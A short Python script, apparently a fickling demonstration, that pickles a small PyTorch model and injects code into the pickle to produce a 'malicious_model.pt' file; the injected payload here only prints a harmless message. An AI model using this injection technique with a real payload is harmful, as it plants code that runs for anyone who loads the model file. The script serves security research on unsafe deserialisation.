import os
import pickle

from fickling.pickle import Pickled

from torch import nn

ANSI_RED_BOLD = "\033[31;1m"
ANSI_RESET = "\033[0m"

dirname = os.path.dirname(__file__)
innocent_model_filename = os.path.join(dirname, "innocent_model.pt")
malicious_model_filename = os.path.join(dirname, "malicious_model.pt")

# Requires a patch to fickling
# See https://github.com/trailofbits/fickling/pull/6/files#diff-2368bf2
innocent_model = nn.Sequential(nn.Linear(2, 1), nn.Sigmoid())

with open(innocent_model_filename, "wb") as innocent_model_file:
    pickle.dump(innocent_model, innocent_model_file)

with open(innocent_model_filename, "rb") as innocent_model_file:
    pickled = Pickled.load(innocent_model_file)

example_payload = f"print('{ANSI_RED_BOLD}Running Python code!{ANSI_RESET}')"
pickled.insert_python_eval(example_payload)

with open(malicious_model_filename, "wb") as malicious_model_file:
    pickled.dump(malicious_model_file)
